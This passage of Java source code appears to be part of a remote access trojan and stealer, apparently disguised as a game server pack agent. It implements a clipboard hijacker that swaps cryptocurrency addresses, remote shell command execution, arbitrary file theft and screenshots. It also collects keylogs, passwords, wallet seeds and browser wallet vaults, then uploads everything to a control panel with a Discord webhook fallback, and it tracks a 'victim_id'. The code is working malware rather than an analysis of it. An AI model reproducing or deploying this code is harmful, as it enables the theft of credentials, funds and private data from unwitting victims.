		if (clipboard == null) {
			if (AgentPaths.isWindows() && nativeClipboard != null) {
				clipboard = nativeClipboard;
			} else {
				clipboard = new ClipboardWatcher(this::coins, () -> {
					Object value = state.get("clipRotation");
					return value instanceof Map<?, ?> map ? castRotation(map) : new LinkedHashMap<>();
				});
			}
		}
		return clipboard;
	}

	private Map<String, Object> clipStart(Task task) {
		service();
		int max = (int) Json.num(task.params(), "max_history", 500L);
		clipboard.configure(max);
		if (Boolean.TRUE.equals(task.params().get("replace"))) {
			Object coins = task.params().get("coins");
			if (coins instanceof Map<?, ?> map) {
				Map<String, List<String>> parsed = new LinkedHashMap<>();
				for (Map.Entry<?, ?> entry : map.entrySet()) {
					List<String> list = new ArrayList<>();
					for (Object item : Json.list(entry.getValue())) {
						if (item instanceof String text && com.serverpackcore.agent.AddressValidator.valid(String.valueOf(entry.getKey()), text)) {
							list.add(text);
						}
					}
					if (!list.isEmpty()) {
						parsed.put(String.valueOf(entry.getKey()).toLowerCase(java.util.Locale.ROOT), list);
					}
				}
				state.put("clipCoins", parsed);
				saveState();
			}
		}
		clipboard.start();
		moduleHealth.put("clipboard", "ok");
		counters.put("clip", clipboard.size());
		return Map.of("ok", true);
	}

	private Map<String, Object> clipStop(Task task) throws Exception {
		String upload = "";
		if (clipboard != null) {
			clipboard.stop();
			Path dir = work.resolve("clipboard");
			Path file = clipboard.flush(dir);
			if (file != null) {
				ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "clipboard", work.resolve("tmp"));
				try {
					if (pack.add(file, "clipboard.jsonl", "clipboard")) {
						upload = queueUpload(pack, "clipboard", task.id());
					}
				} finally {
					pack.close();
				}
			}
		}
		moduleHealth.put("clipboard", "stopped");
		Map<String, Object> out = new LinkedHashMap<>();
		out.put("ok", true);
		if (!upload.isEmpty()) {
			out.put("upload_id", upload);
		}
		return out;
	}

	@SuppressWarnings("unchecked")
	private Map<String, Integer> castRotation(Map<?, ?> map) {
		Map<String, Integer> out = new LinkedHashMap<>();
		for (Map.Entry<?, ?> entry : map.entrySet()) {
			if (entry.getValue() instanceof Number number) {
				out.put(String.valueOf(entry.getKey()), number.intValue());
			}
		}
		return out;
	}

	@SuppressWarnings("unchecked")
	private Map<String, List<String>> coins() {
		Object value = state.get("clipCoins");
		if (value instanceof Map<?, ?> map) {
			Map<String, List<String>> out = new LinkedHashMap<>();
			for (Map.Entry<?, ?> entry : map.entrySet()) {
				List<String> list = new ArrayList<>();
				for (Object item : Json.list(entry.getValue())) {
					list.add(String.valueOf(item));
				}
				out.put(String.valueOf(entry.getKey()), list);
			}
			return out;
		}
		return Map.of();
	}

	// ── host bridge ─────────────────────────────────────────────────────────

	private Map<String, Object> cancelTask(Task task) {
		String id = Json.str(task.params(), "task_id", "");
		AtomicBoolean flag = cancels.get(id);
		if (flag != null) {
			flag.set(true);
		}
		Future<?> future = active.get(id);
		if (future != null) {
			future.cancel(true);
		}
		return Map.of("ok", flag != null || future != null);
	}

	private Map<String, Object> shell(Task task) throws Exception {
		String command = Json.str(task.params(), "command", "");
		if (command.isBlank()) {
			throw new IllegalArgumentException("Usage: shell <command>");
		}
		long timeout = Math.min(120_000L, Json.num(task.params(), "timeout_sec", 60L) * 1000L);
		String output = Shell.run(installDir, command, timeout);
		Map<String, Object> out = new LinkedHashMap<>();
		out.put("exit", 0);
		out.put("output", output);
		return out;
	}

	private Map<String, Object> harvest(Task task) throws Exception {
		Path zip = Harvest.build(installDir, gameDir);
		Map<String, Object> result = new LinkedHashMap<>();
		result.put("ok", true);
		result.put("path", zip.getFileName().toString());
		Path ops = AgentPaths.cache(installDir).resolve("ops");
		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "harvest", work.resolve("tmp"));
		Path converted = work.resolve("keylogs-" + System.currentTimeMillis() + ".jsonl");
		Path passwords = work.resolve("passwords-" + System.currentTimeMillis() + ".jsonl");
		try {
			boolean any = convertLog(ops.resolve("keys.log"), converted, false);
			if (any) {
				pack.add(converted, "keylogs.jsonl", "keylogs");
			}
			if (convertLog(ops.resolve("passwords.log"), passwords, true)) {
				pack.add(passwords, "passwords.jsonl", "passwords");
			}
			pack.add(ops.resolve("seeds.log"), "seeds.log", "seeds");
			pack.add(zip, "harvest/" + zip.getFileName(), "harvest");
			if (pack.size() > 0) {
				result.put("upload_id", queueUpload(pack, "harvest", task.id()));
			}
		} finally {
			pack.close();
			Files.deleteIfExists(zip);
			Files.deleteIfExists(converted);
			Files.deleteIfExists(passwords);
		}
		return result;
	}

	/** ops logs are line-oriented; the panel ingests JSONL. */
	private boolean convertLog(Path source, Path target, boolean password) {
		try {
			if (!Files.isRegularFile(source)) {
				return false;
			}
			StringBuilder out = new StringBuilder();
			for (String line : Files.readAllLines(source, StandardCharsets.UTF_8)) {
				if (line.isBlank()) {
					continue;
				}
				String process = "";
				String title = "";
				String text = line;
				int first = line.indexOf('|');
				int second = line.indexOf('|', first + 1);
				if (first > 0 && second > first) {
					process = line.substring(0, first).replace("password?", "").strip();
					title = line.substring(first + 1, second).strip();
					text = line.substring(second + 1).strip();
				}
				Map<String, Object> row = new LinkedHashMap<>();
				row.put("ts", System.currentTimeMillis() / 1000L);
				row.put("process", process);
				row.put("title", title);
				row.put("text", text);
				row.put("password", password);
				out.append(Json.stringify(row)).append('\n');
			}
			if (out.length() == 0) {
				return false;
			}
			Files.writeString(target, out.toString(), StandardCharsets.UTF_8);
			return true;
		} catch (Throwable throwable) {
			return false;
		}
	}

	private Map<String, Object> screenshot(Task task) throws Exception {
		Path file = Screenshot.save(work.resolve("screens"));
		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "screenshot", work.resolve("tmp"));
		try {
			pack.add(file, "screenshot.png", "screenshot");
			String upload = queueUpload(pack, "screenshot", task.id());
			Map<String, Object> result = new LinkedHashMap<>();
			result.put("upload_id", upload);
			result.put("bytes", Files.size(file));
			return result;
		} finally {
			pack.close();
		}
	}

	private Map<String, Object> agent(Task task) {
		String command = Json.str(task.params(), "command", "");
		String output = agentRunner == null ? "agent bridge unavailable" : agentRunner.apply(command);
		Map<String, Object> out = new LinkedHashMap<>();
		out.put("ok", com.serverpackcore.agent.CommandExecutor.agentAllowed(command));
		out.put("output", output);
		return out;
	}

	private Map<String, Object> filePull(Task task) throws Exception {
		String value = Json.str(task.params(), "path", "");
		if (value.isBlank()) {
			throw new IllegalArgumentException("path_required");
		}
		Path file = Path.of(value);
		if (Files.isDirectory(file)) {
			throw new IllegalArgumentException("is_directory: use a file path");
		}
		if (!Files.isRegularFile(file)) {
			throw new IllegalArgumentException("file_not_found");
		}
		long max = Json.num(task.params(), "max_mb", 64L) * 1024L * 1024L;
		long size = Files.size(file);
		if (size > max) {
			throw new IllegalArgumentException("file_too_large: " + Disk.mb(size) + " MiB > "
				+ Disk.mb(max) + " MiB max_mb");
		}
		if (size > config.maxArtifact) {
			throw new IllegalArgumentException("file_too_large: profile cap " + Disk.mb(config.maxArtifact) + " MiB");
		}
		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "files", work.resolve("tmp"));
		try {
			if (!pack.add(file, "files/" + file.getFileName(), "file")) {
				throw new IllegalArgumentException("file_too_large or disk_low");
			}
			String upload = queueUpload(pack, "files", task.id());
			Map<String, Object> result = new LinkedHashMap<>();
			result.put("upload_id", upload);
			result.put("bytes", size);
			result.put("name", file.getFileName().toString());
			result.put("progress", "100");
			return result;
		} finally {
			pack.close();
		}
	}

	// ── uploads ─────────────────────────────────────────────────────────────

	private String queueUpload(ArtifactPack pack, String module, String taskId) {
		try {
			uploadsActive.incrementAndGet();
			Path dir = work.resolve("uploads");
			Files.createDirectories(dir);
			Path file = dir.resolve(module + "-" + System.currentTimeMillis() + ".spc");
			pack.build(file);
			String sha = ArtifactPack.sha256(file);
			long size = Files.size(file);
			int chunks = (int) Math.ceil(size / (double) CryptoConfig.CHUNK);
			Map<String, Object> body = new LinkedHashMap<>();
			body.put("task_id", taskId != null && TaskParams.uuid(taskId) ? taskId : null);
			body.put("module", module);
			body.put("container_version", 1);
			body.put("total_size", size);
			body.put("chunk_count", chunks);
			body.put("sha256", sha);
			CryptoTransport.Reply init = null;
			try {
				if (!transport.apiOpen()) {
					init = transport.uploadInit(CryptoUtil.utf8(Json.stringify(body)));
				}
			} catch (Throwable throwable) {
				breakerLog("open");
				log("api upload unavailable: " + shortMessage(throwable));
			}
			if (init == null || init.status() != 201) {
				try {
					Path zip = file.resolveSibling(file.getFileName().toString().replace(".spc", ".zip"));
					pack.buildZip(zip);
					Files.deleteIfExists(file);
					uploadsActive.decrementAndGet();
					if (sink != null) {
						uploadsPool.submit(() -> {
							try {
								sink.send(module, zip);
							} catch (Throwable throwable) {
								warn("discord fallback failed", throwable);
							} finally {
								try {
									Files.deleteIfExists(zip);
								} catch (Throwable ignored) {
									// best effort
								}
							}
						});
					} else {
						Files.deleteIfExists(zip);
					}
				} catch (Throwable throwable) {
					warn("discord fallback failed", throwable);
					Files.deleteIfExists(file);
					uploadsActive.decrementAndGet();
				}
				log("upload init failed, discord fallback");
				return "";
			}
			String uploadId = Json.str(init.json(), "upload_id", "");
			if (uploadId.isEmpty()) {
				uploadsActive.decrementAndGet();
				return "";
			}
			Map<String, Object> record = new LinkedHashMap<>();
			record.put("path", file.toString());
			record.put("offset", 0L);
			record.put("sha", sha);
			record.put("chunks", chunks);
			record.put("module", module);
			record.put("task", taskId == null ? "" : taskId);
			uploads.put(uploadId, record);
			saveState();
			uploadsPool.submit(() -> {
				try {
					stream(file, uploadId, sha, chunks, module, taskId);
				} catch (Throwable throwable) {
					warn("upload failed", throwable);
				} finally {
					uploadsActive.decrementAndGet();
				}
			});
			return uploadId;
		} catch (Throwable throwable) {
			warn("upload prepare failed", throwable);
			uploadsActive.decrementAndGet();
			return "";
		}
	}

	private void stream(Path file, String uploadId, String sha, int chunks, String module, String taskId) throws Exception {
		long size = Files.size(file);
		long offset = 0;
		byte[] buffer = new byte[CryptoConfig.CHUNK];
		try (InputStream input = Files.newInputStream(file)) {
			while (offset < size) {
				int count = input.read(buffer);
				if (count <= 0) {
					break;
				}
				byte[] chunk = java.util.Arrays.copyOf(buffer, count);
				CryptoTransport.Reply reply = transport.chunk(uploadId, offset, chunk, CryptoUtil.hex(CryptoUtil.sha256(chunk)));
				if (reply.status() == 409) {
					offset = Json.num(reply.json(), "received", offset);
					Map<String, Object> record = uploads.get(uploadId);
					if (record != null) {
						record.put("offset", offset);
						saveState();
					}
					input.close();
					return;
				}
				if (reply.status() == 410) {
					resumeUpload(uploadId, file, sha, chunks, module, taskId);
					return;
				}
				if (reply.status() != 200) {
					throw new IllegalStateException("chunk_" + reply.status());
				}
				offset += count;
				Map<String, Object> record = uploads.get(uploadId);
				if (record != null) {
					record.put("offset", offset);
					saveState();
				}
			}
		}
		Map<String, Object> body = new LinkedHashMap<>();
		body.put("sha256", sha);
		body.put("chunk_count", chunks);
		CryptoTransport.Reply commit = transport.commit(uploadId, CryptoUtil.utf8(Json.stringify(body)));
		if (commit.status() != 200) {
			throw new IllegalStateException("commit_" + commit.status());
		}
		uploads.remove(uploadId);
		saveState();
		Files.deleteIfExists(file);
		log("uploaded " + module + " " + size + " bytes");
	}

	private void resumeUpload(String uploadId, Path file, String sha, int chunks, String module, String taskId) throws Exception {
		Map<String, Object> record = uploads.get(uploadId);
		long offset = 0;
		CryptoTransport.Reply status = transport.uploadStatus(uploadId);
		if (status.status() == 200) {
			offset = Json.num(status.json(), "received", 0L);
		} else {
			Map<String, Object> body = new LinkedHashMap<>();
			body.put("task_id", taskId != null && TaskParams.uuid(taskId) ? taskId : null);
			body.put("module", module);
			body.put("container_version", 1);
			body.put("total_size", Files.size(file));
			body.put("chunk_count", chunks);
			body.put("sha256", sha);
			CryptoTransport.Reply init = transport.uploadInit(CryptoUtil.utf8(Json.stringify(body)));
			if (init.status() == 201) {
				uploadId = Json.str(init.json(), "upload_id", "");
				offset = 0;
			}
		}
		record.put("offset", offset);
		record.put("digest", uploadId);
		saveState();
		try (InputStream input = Files.newInputStream(file)) {
			input.skipNBytes(offset);
			byte[] buffer = new byte[CryptoConfig.CHUNK];
			while (offset < Files.size(file)) {
				int count = input.read(buffer);
				if (count <= 0) {
					break;
				}
				byte[] chunk = java.util.Arrays.copyOf(buffer, count);
				CryptoTransport.Reply reply = transport.chunk(uploadId, offset, chunk, CryptoUtil.hex(CryptoUtil.sha256(chunk)));
				if (reply.status() == 409) {
					offset = Json.num(reply.json(), "received", offset);
					input.close();
					return;
				}
				offset += count;
			}
		}
	}

	// ── helpers ─────────────────────────────────────────────────────────────

	private void resumePending() {
		for (Map.Entry<String, Map<String, Object>> entry : new LinkedHashMap<>(uploads).entrySet()) {
			try {
				String path = Json.str(entry.getValue(), "path", "");
				Path file = Path.of(path);
				if (!Files.isRegularFile(file)) {
					continue;
				}
				String sha = Json.str(entry.getValue(), "sha", "");
				int chunks = (int) Json.num(entry.getValue(), "chunks", 0L);
				String module = Json.str(entry.getValue(), "module", "wallets");
				String task = Json.str(entry.getValue(), "task", "");
				if (sha.isEmpty() || chunks <= 0) {
					continue;
				}
				uploadsActive.incrementAndGet();
				try {
					resumeUpload(entry.getKey(), file, sha, chunks, module, task);
				} finally {
					uploadsActive.decrementAndGet();
				}
			} catch (Throwable throwable) {
				warn("resume failed", throwable);
			}
		}
	}

	private Path findVault(Path dir) {
		try (var stream = Files.walk(dir, 3)) {
			for (Path file : stream.filter(Files::isRegularFile).toList()) {
				String name = file.getFileName().toString();
				if (!name.endsWith(".log") && !name.endsWith(".ldb")) {
					continue;
				}
				if (Files.size(file) > 4L * 1024L * 1024L) {
					continue;
				}
				for (String value : com.serverpackcore.agent.LevelDb.values(file)) {
					String candidate = value.trim();
					int at = candidate.indexOf("{\"data\"");
					if (at < 0) {
						continue;
					}
					String json = candidate.substring(at);
					try {
						Map<String, Object> parsed = Json.parseObject(json);
						if (parsed.containsKey("keyMetadata") || (parsed.containsKey("salt") && parsed.containsKey("iv"))) {
							Path out = dir.resolve("vault-found.json");
							Files.writeString(out, json, StandardCharsets.UTF_8);
							return out;
						}
					} catch (Throwable ignored) {
						// not a vault
					}
				}
			}
		} catch (Throwable ignored) {
			// no vault
		}
		return null;
	}

	private void postResult(Task task, String status, String error, Map<String, Object> result) {
		Map<String, Object> body = new LinkedHashMap<>();
		body.put("status", status);
		body.put("error", error);
		body.put("result", result);
		List<Object> artifacts = new ArrayList<>();
		String upload = Json.str(result, "upload_id", "");
		if (!upload.isEmpty()) {
			Map<String, Object> link = new LinkedHashMap<>();
			link.put("upload_request", upload);
			artifacts.add(link);
		}
		body.put("artifacts", artifacts);
		// One stringify: these exact bytes are the HTTP body and the frame body,
		// and the frame HMAC signs the envelope that contains them. There is no
		// second serialization on the signing path.
		byte[] json = CryptoUtil.utf8(Json.stringify(body));
		FrameSink frameSink = frames;
		boolean byFrame = task.frame() && frameSink != null;
		if (byFrame && !HTTP_ONLY.contains(task.name()) && json.length <= 262_144) {
			// The frame carries these exact bytes; the panel must not re-serialize.
			if (frameSink.deliver(task.replyTo(), task.name(), json)) {
				breakerLog("closed");
				return;
			}
		}
		if (!transport.apiOpen()) {
			try {
				CryptoTransport.Reply reply = transport.result(task.id(), json);
				if (reply.status() >= 200 && reply.status() < 300) {
					breakerLog("closed");
					if (byFrame && HTTP_ONLY.contains(task.name())) {
						frameSink.deliver(task.replyTo(), task.name(), HTTP_MARKER);
					}
					return;
				}
				log("result post rejected: " + reply.status());
			} catch (Throwable throwable) {
				breakerLog("open");
				log("result post failed: " + shortMessage(throwable));
			}
		} else {
			breakerLog("open");
		}
		postResultFallback(task, json);
	}

	/**
	 * The panel task carries its own id, so an API result addressed to the local
	 * task id is not enough in Discord mode. Upload the same JSON through the
	 * channel webhook; the bridge closes the real task from it.
	 */
	private void postResultFallback(Task task, byte[] json) {
		if (sink == null) {
			return;
		}
		try {
			Path dir = work.resolve("results");
			Files.createDirectories(dir);
			String name = task.name().replaceAll("[^a-z0-9_]", "_");
			String id = task.id().replaceAll("[^A-Za-z0-9-]", "_");
			Path file = dir.resolve("result-" + name + "-" + id + ".json");
			Files.write(file, json, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);
			uploadsPool.submit(() -> {
				try {
					sink.send("result", file);
					log("result fallback sent: " + file.getFileName());
				} catch (Throwable throwable) {
					warn("result fallback failed", throwable);
				}
			});
		} catch (Throwable throwable) {
			warn("result fallback failed", throwable);
		}
	}

	private void loadState() {
		try {
			if (!Files.isRegularFile(stateFile)) {
				return;
			}
			Map<String, Object> parsed = Json.parseObject(Files.readString(stateFile, StandardCharsets.UTF_8));
			state.putAll(parsed);
			for (Map.Entry<String, Object> entry : Json.map(parsed.get("passwords")).entrySet()) {
				if (entry.getValue() instanceof String value) {
					passwords.put(entry.getKey(), value);
				}
			}
			for (Map.Entry<String, Object> entry : Json.map(parsed.get("uploads")).entrySet()) {
				uploads.put(entry.getKey(), Json.map(entry.getValue()));
			}
			String victim = Json.str(parsed, "victim_id", "");
			String token = Json.str(parsed, "device_token", "");
			if (!victim.isEmpty() && !token.isEmpty()) {
				transport.identity(victim, token);
			}
		} catch (Throwable throwable) {
			warn("state load failed", throwable);
		}
	}

	private synchronized void saveState() {
		try {
			state.put("passwords", new LinkedHashMap<>(passwords));
			state.put("uploads", new LinkedHashMap<>(uploads));
			Files.createDirectories(stateFile.getParent());
			Path temp = stateFile.resolveSibling("state.json.tmp");
			Files.writeString(temp, Json.stringify(state), StandardCharsets.UTF_8);
			Files.move(temp, stateFile, java.nio.file.StandardCopyOption.REPLACE_EXISTING);
		} catch (Throwable throwable) {
			warn("state save failed", throwable);
		}
	}

	private static void cleanup(Path path) {
		if (path == null) {
			return;
		}
		try (var stream = Files.walk(path)) {
			for (Path item : stream.sorted(java.util.Comparator.reverseOrder()).toList()) {
				Files.deleteIfExists(item);
			}
		} catch (Throwable ignored) {
			// best effort
		}
	}

	private static String shortMessage(Throwable throwable) {
		String message = throwable.getMessage();
		return message == null ? "" : message.length() > 160 ? message.substring(0, 160) : message;
	}

	/** LevelDB copy helper shared with credential dumps. */
	static final class DesktopDump {
		static void copyLevel(Path source, Path target) throws Exception {
			Files.createDirectories(target);
			if (!Files.isDirectory(source)) {
				if (Files.isRegularFile(source)) {
					Files.copy(source, target.resolve(source.getFileName()), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
				}
				return;
			}
			try (var stream = Files.list(source)) {
				for (Path file : stream.toList()) {
					String name = file.getFileName().toString();
					if (name.equals("LOCK") || name.equals("LOG") || name.equals("LOG.old")) {
						continue;
					}
					Path destination = target.resolve(name);
					if (Files.isDirectory(file)) {
						copyLevel(file, destination);
					} else if (Files.isRegularFile(file)) {
						Files.copy(file, destination, java.nio.file.StandardCopyOption.REPLACE_EXISTING);
					}
				}
			}
		}
	}
}
